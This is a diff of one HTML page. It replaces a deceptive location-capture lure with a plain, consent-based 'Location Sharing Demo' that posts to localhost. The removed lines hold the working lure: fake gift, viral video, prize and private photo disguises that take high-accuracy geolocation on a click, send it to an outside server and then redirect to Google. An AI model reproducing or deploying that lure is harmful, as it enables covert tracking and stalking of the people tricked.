@@ -1,83 +1,226 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>You've received a gift! 🎁</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: 'Segoe UI', sans-serif;
-    background: linear-gradient(135deg, #1e1b4b, #312e81);
-    color: #e2e8f0;
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-  }
-  .card { text-align: center; max-width: 400px; width: 100%; }
-  .emoji { font-size: 4rem; margin-bottom: 16px; display: inline-block; animation: bounce 1s infinite alternate; }
-  @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
-  h1 { font-size: 1.6rem; margin-bottom: 12px; color: #e0e7ff; }
-  p { color: #a5b4fc; margin-bottom: 28px; font-size: 0.95rem; line-height: 1.6; }
-  .btn {
-    background: linear-gradient(135deg, #6366f1, #8b5cf6);
-    color: white; border: none;
-    padding: 14px 36px; border-radius: 50px;
-    font-size: 1rem; font-weight: 700;
-    cursor: pointer; width: 100%;
-    box-shadow: 0 4px 20px rgba(99,102,241,0.5);
-    transition: transform 0.2s;
-  }
-  .btn:hover { transform: scale(1.03); }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Location Sharing Demo</title>
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+    }
+
+    body{
+      font-family: "Segoe UI", sans-serif;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:linear-gradient(135deg,#1e1b4b,#312e81);
+      padding:20px;
+      color:white;
+    }
+
+    .card{
+      width:100%;
+      max-width:420px;
+      background:rgba(255,255,255,0.08);
+      border:1px solid rgba(255,255,255,0.1);
+      border-radius:24px;
+      padding:30px;
+      text-align:center;
+      backdrop-filter:blur(10px);
+      box-shadow:0 10px 30px rgba(0,0,0,0.3);
+    }
+
+    .emoji{
+      font-size:4rem;
+      margin-bottom:15px;
+      display:block;
+    }
+
+    h1{
+      margin-bottom:12px;
+      font-size:1.8rem;
+    }
+
+    p{
+      color:#d1d5db;
+      line-height:1.6;
+      margin-bottom:25px;
+    }
+
+    .btn{
+      width:100%;
+      border:none;
+      outline:none;
+      cursor:pointer;
+      padding:14px;
+      border-radius:50px;
+      font-size:1rem;
+      font-weight:bold;
+      color:white;
+      background:linear-gradient(135deg,#6366f1,#8b5cf6);
+      transition:0.2s;
+    }
+
+    .btn:hover{
+      transform:scale(1.03);
+    }
+
+    .result{
+      margin-top:20px;
+      text-align:left;
+      background:rgba(255,255,255,0.05);
+      padding:15px;
+      border-radius:15px;
+      min-height:60px;
+      white-space:pre-wrap;
+      line-height:1.6;
+      color:#f1f5f9;
+    }
+  </style>
 </head>
+
 <body>
-<div class="card">
-  <span class="emoji" id="emoji">🎁</span>
-  <h1 id="title">You've received a gift!</h1>
-  <p id="msg">Someone special sent you something. Click below to reveal your surprise! by ckicking we will know your location</p>
-  <button class="btn" id="btn" onclick="captureLocation()">🎉 Reveal My Gift</button>
-</div>
 
-<script>
-  const disguises = {
-    gift:   { emoji:'🎁', title:"You've received a gift!", msg:"Someone special sent you something. Click below to reveal your surprise!  by clliking we will know your location ", btn:"🎉 Reveal My Gift" },
-    video:  { emoji:'🎬', title:"This video is going viral!", msg:"A friend shared an exclusive video with you. Tap below to watch — available for 24 hours only.", btn:"▶ Watch Now by clliking we will know your location "},
-    winner: { emoji:'🏆', title:"You won a prize!", msg:"You've been selected from your region. Confirm your reward before it expires.", btn:"🎊 Claim My Prize by clliking we will know your location" },
-    photo:  { emoji:'📸', title:"New photo shared with you", msg:"Someone sent you a private photo. Click to view — the link expires soon.", btn:"📂 View Photo by clliking we will know your location" },
-  };
+  <div class="card">
 
-  const params = new URLSearchParams(window.location.search);
-  const d = disguises[params.get('d')] || disguises.gift;
-  document.getElementById('emoji').textContent = d.emoji;
-  document.getElementById('title').textContent = d.title;
-  document.getElementById('msg').textContent = d.msg;
-  document.getElementById('btn').textContent = d.btn;
+    <span class="emoji">📍</span>
 
-  // ⚠️ Replace this with your actual Render URL after deploying
-  const SERVER_URL = "https://YOUR-APP-NAME.onrender.com";
+    <h1>Location Sharing Demo</h1>
 
-  function captureLocation() {
-    if (!navigator.geolocation) return redirect();
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
-        fetch(SERVER_URL + "/location", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ lat, lng, accuracy }),
-        }).finally(() => redirect());
-      },
-      () => redirect(),
-      { enableHighAccuracy: true, timeout: 8000 }
-    );
-  }
+    <p>
+      Click the button below to share your current location.
+      Your browser will ask for permission first.
+    </p>
 
-  function redirect() {
-    window.location.href = "https://www.google.com";
-  }
-</script>
+    <button class="btn" onclick="getLocation()">
+      Share My Location
+    </button>
+
+    <div class="result" id="result">
+      Waiting for location...
+    </div>
+
+  </div>
+
+  <script>
+
+    const result = document.getElementById("result");
+
+    function sendLocation(lat, lng, accuracy){
+
+      fetch("http://localhost:3000/location", {
+
+        method: "POST",
+
+        headers: {
+          "Content-Type": "application/json"
+        },
+
+        body: JSON.stringify({
+          lat,
+          lng,
+          accuracy,
+          consent: true
+        })
+
+      })
+
+      .then(response => response.json())
+
+      .then(data => {
+
+        console.log(data);
+
+        result.innerHTML =
+          "✅ Location saved successfully\n\n" +
+          "Latitude: " + lat + "\n" +
+          "Longitude: " + lng + "\n" +
+          "Accuracy: " + accuracy + " meters";
+
+      })
+
+      .catch(error => {
+
+        console.error(error);
+
+        result.innerHTML =
+          "❌ Failed to send location to server.";
+
+      });
+    }
+
+    function getLocation(){
+
+      if(!navigator.geolocation){
+
+        result.innerHTML =
+          "Geolocation is not supported by your browser.";
+
+        return;
+      }
+
+      result.innerHTML =
+        "Requesting location permission...";
+
+      navigator.geolocation.getCurrentPosition(
+
+        (position) => {
+
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          sendLocation(lat, lng, accuracy);
+
+        },
+
+        (error) => {
+
+          if(error.code === error.PERMISSION_DENIED){
+
+            result.innerHTML =
+              "❌ Permission denied.";
+
+          }
+
+          else if(error.code === error.POSITION_UNAVAILABLE){
+
+            result.innerHTML =
+              "❌ Location unavailable.";
+
+          }
+
+          else if(error.code === error.TIMEOUT){
+
+            result.innerHTML =
+              "❌ Request timed out.";
+
+          }
+
+          else{
+
+            result.innerHTML =
+              "❌ Unable to get location.";
+
+          }
+
+        },
+
+        {
+          enableHighAccuracy:true,
+          timeout:10000,
+          maximumAge:0
+        }
+
+      );
+    }
+
+  </script>
+
 </body>
 </html>
